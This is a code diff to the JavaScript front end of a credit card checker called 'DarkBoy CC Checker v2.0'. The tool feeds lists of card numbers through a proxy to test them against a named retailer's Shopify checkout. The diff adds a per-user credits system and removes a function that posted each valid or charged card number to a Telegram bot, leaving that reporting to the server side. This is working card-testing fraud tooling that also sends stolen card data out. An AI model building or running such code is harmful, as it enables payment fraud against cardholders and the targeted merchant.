@@ -251,7 +251,8 @@ async function processCreditCards(ccList) {
         addTerminalMessage(`🔄 Processing: ${cc}`, 'processing');
         
         try {
-            // Call Vercel API proxy with user's Telegram credentials
+            // Call Vercel API proxy with user's credentials
+            const username = localStorage.getItem('cc_checker_username');
             const response = await fetch('/api/proxy', {
                 method: 'POST',
                 headers: {
@@ -260,8 +261,9 @@ async function processCreditCards(ccList) {
                 body: JSON.stringify({
                     cc: cc,
                     site: 'buildersdiscountwarehouse.com.au',
-                    userBotToken: botToken, // User's bot token
-                    userChatId: chatId      // User's chat ID
+                    username: username,     // User's username for credits
+                    userBotToken: botToken, // User's bot token (optional)
+                    userChatId: chatId      // User's chat ID (optional)
                 })
             });
             
@@ -299,9 +301,7 @@ async function processCreditCards(ccList) {
         updateAllStats();
         
         // Update credits display after each check
-        if (userChatId) {
-            checkCredits();
-        }
+        checkCredits();
         
         // Delay between requests
         if (isProcessing) {
@@ -373,33 +373,7 @@ function handleError(cc, errorMsg) {
     addResult(cc, errorMsg, 'declined', false);
 }
 
-async function sendTelegramNotification(cc, response, category) {
-    try {
-        const emoji = category === 'charged' ? '💳' : '✅';
-        const message = `${emoji} **${category.toUpperCase()} CARD DETECTED**\n\n` +
-            `💳 **Card:** \`${cc}\`\n` +
-            `🔧 **Gateway:** Auto Shopify\n` +
-            `📝 **Response:** ${response}\n` +
-            `📊 **Category:** ${category.toUpperCase()}\n` +
-            `⏰ **Time:** ${new Date().toLocaleString()}\n` +
-            `📈 **Session Stats:** ${stats.approved + stats.charged}/${stats.total}\n\n` +
-            `🚀 **DarkBoy CC Checker v2.0**`;
-        
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-    } catch (error) {
-        console.log('Telegram notification failed:', error);
-    }
-}
+// Function removed - notifications now handled server-side
 
 // UI Update Functions
 function addTerminalMessage(message, type = 'info') {
